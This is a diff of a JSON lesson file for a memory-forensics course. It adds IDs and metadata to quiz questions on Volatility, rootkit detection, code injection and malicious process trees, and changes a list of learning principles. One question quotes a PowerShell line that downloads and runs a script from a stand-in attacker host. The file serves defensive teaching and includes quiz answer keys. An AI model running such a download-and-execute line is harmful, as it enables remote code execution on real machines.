@@ -4,7 +4,10 @@
   "title": "Advanced Memory Forensics: Volatility and Live System Analysis",
   "difficulty": 3,
   "order_index": 7,
-  "prerequisites": ["dfir_01", "dfir_04"],
+  "prerequisites": [
+    "dfir_01",
+    "dfir_04"
+  ],
   "concepts": [
     "Memory Acquisition Techniques",
     "Volatility Framework Deep Dive",
@@ -101,7 +104,10 @@
         "The process is making network connections"
       ],
       "correct_answer": 1,
-      "explanation": "When a process appears in psscan (finds all EPROCESS structures) but NOT in pslist (walks active process list), it means the process has been unlinked from the process list—a classic rootkit hiding technique called DKOM (Direct Kernel Object Manipulation). The process is running but hidden from normal enumeration."
+      "explanation": "When a process appears in psscan (finds all EPROCESS structures) but NOT in pslist (walks active process list), it means the process has been unlinked from the process list—a classic rootkit hiding technique called DKOM (Direct Kernel Object Manipulation). The process is running but hidden from normal enumeration.",
+      "question_id": "f2532a52-f810-4c6a-8b4f-49fb7568e5b0",
+      "type": "multiple_choice",
+      "difficulty": 3
     },
     {
       "question": "You find memory with Protection: PAGE_EXECUTE_READWRITE, Vad Tag: VadS, and Flags: PrivateMemory in explorer.exe. What's the MOST likely explanation?",
@@ -112,7 +118,10 @@
         "Explorer.exe has crashed and created a crash dump"
       ],
       "correct_answer": 2,
-      "explanation": "RWX (Read-Write-Execute) permissions on private memory (not backed by a file) with VadS tag is a strong indicator of code injection. Legitimate DLLs have VAD tag and are not simultaneously writable and executable. This combination is classic shellcode or reflectively-loaded malicious code."
+      "explanation": "RWX (Read-Write-Execute) permissions on private memory (not backed by a file) with VadS tag is a strong indicator of code injection. Legitimate DLLs have VAD tag and are not simultaneously writable and executable. This combination is classic shellcode or reflectively-loaded malicious code.",
+      "question_id": "3d36b8a4-1113-4785-9f6f-71df221ccc94",
+      "type": "multiple_choice",
+      "difficulty": 3
     },
     {
       "question": "You decode a PowerShell command and find: 'IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')'. What does 'IEX' do?",
@@ -123,7 +132,10 @@
         "Initiates an encrypted exchange with the server"
       ],
       "correct_answer": 1,
-      "explanation": "IEX (Invoke-Expression) executes a string as PowerShell code. This pattern downloads a remote script and immediately executes it in memory (fileless attack). The code never touches disk, making it harder to detect with traditional AV."
+      "explanation": "IEX (Invoke-Expression) executes a string as PowerShell code. This pattern downloads a remote script and immediately executes it in memory (fileless attack). The code never touches disk, making it harder to detect with traditional AV.",
+      "question_id": "5eef4359-027c-4ce4-b07e-88cbdf93f06b",
+      "type": "multiple_choice",
+      "difficulty": 3
     },
     {
       "question": "While analyzing a memory dump, you see winword.exe (PID 2000) has spawned cmd.exe (PID 3000), which spawned powershell.exe (PID 4000). What does this process tree indicate?",
@@ -134,7 +146,10 @@
         "Windows Update process initiated by Office"
       ],
       "correct_answer": 2,
-      "explanation": "Microsoft Word should NEVER spawn cmd.exe or PowerShell in normal operation. This process tree is a classic indicator of macro-based malware: malicious macro → cmd.exe → PowerShell (to download/execute payload). This is one of the most common initial access vectors."
+      "explanation": "Microsoft Word should NEVER spawn cmd.exe or PowerShell in normal operation. This process tree is a classic indicator of macro-based malware: malicious macro → cmd.exe → PowerShell (to download/execute payload). This is one of the most common initial access vectors.",
+      "question_id": "aede80c2-06fa-4966-a6b7-08942be1d061",
+      "type": "multiple_choice",
+      "difficulty": 3
     },
     {
       "question": "You want to dump a suspicious DLL from memory that was loaded by PID 5832. Which Volatility command is correct?",
@@ -145,13 +160,22 @@
         "volatility -f memory.raw --profile=Win10x64 netscan -p 5832"
       ],
       "correct_answer": 1,
-      "explanation": "dlldump extracts DLLs from a process's memory to disk for further analysis (VirusTotal, IDA Pro, etc.). Option A (pslist) only lists processes. Option C (memdump) dumps ALL process memory, not just DLLs. Option D (netscan) shows network connections, not DLLs."
+      "explanation": "dlldump extracts DLLs from a process's memory to disk for further analysis (VirusTotal, IDA Pro, etc.). Option A (pslist) only lists processes. Option C (memdump) dumps ALL process memory, not just DLLs. Option D (netscan) shows network connections, not DLLs.",
+      "question_id": "ab92e556-9588-4257-a53d-1d1ec6873811",
+      "type": "multiple_choice",
+      "difficulty": 3
     }
   ],
   "jim_kwik_principles": [
     "active_learning",
-    "state_management",
-    "memory_techniques",
-    "real_world_application"
+    "memory_hooks",
+    "minimum_effective_dose",
+    "teach_like_im_10",
+    "meta_learning",
+    "connect_to_what_i_know",
+    "reframe_limiting_beliefs",
+    "gamify_it",
+    "learning_sprint",
+    "multiple_memory_pathways"
   ]
 }
